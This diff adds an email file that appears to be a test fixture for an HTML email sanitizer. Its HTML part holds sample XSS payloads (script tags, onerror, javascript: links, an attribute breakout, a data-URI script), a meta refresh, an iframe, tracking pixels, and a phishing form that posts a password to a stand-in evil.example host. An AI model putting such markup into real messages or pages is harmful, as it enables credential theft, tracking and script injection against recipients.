@@ -1,0 +1,39 @@
+Subject: Urgent: =?utf-8?b?0L/RgNC+0LLQtdGA0LrQsA==?=
+From: mallory@example.com
+To: bob@example.com
+Date: Fri, 09 Jan 2026 16:00:00 +0100
+Message-ID: <evil-001@example.com>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="===============2947016926390137804=="
+
+--===============2947016926390137804==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+plain fallback
+
+--===============2947016926390137804==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><head><meta http-equiv=3D"refresh" content=3D"0;url=3Dhttps://evil.exam=
+ple/">
+<style>body { background: url("https://evil.example/css.gif"); }</style></hea=
+d><body>
+<script>alert('xss')</script>
+<img src=3D"x" onerror=3D"alert('xss')">
+<img src=3D"x" title=3D'"><script>alert("breakout")</script>'>
+<a href=3D"javascript:alert('xss')">click me</a>
+<a href=3D"https://safe.example/doc">legit link</a>
+<form action=3D"https://evil.example/phish" method=3D"post"><input name=3D"pa=
+ssword"></form>
+<iframe src=3D"https://evil.example/frame"></iframe>
+<img src=3D"https://evil.example/track.gif" width=3D"1" height=3D"1">
+<img src=3D"data:text/html,<script>alert(1)</script>">
+<p style=3D"background:url(https://evil.example/p.gif)">styled &lt;script&gt;=
+entity smuggle&lt;/script&gt;</p>
+</body></html>
+
+--===============2947016926390137804==--
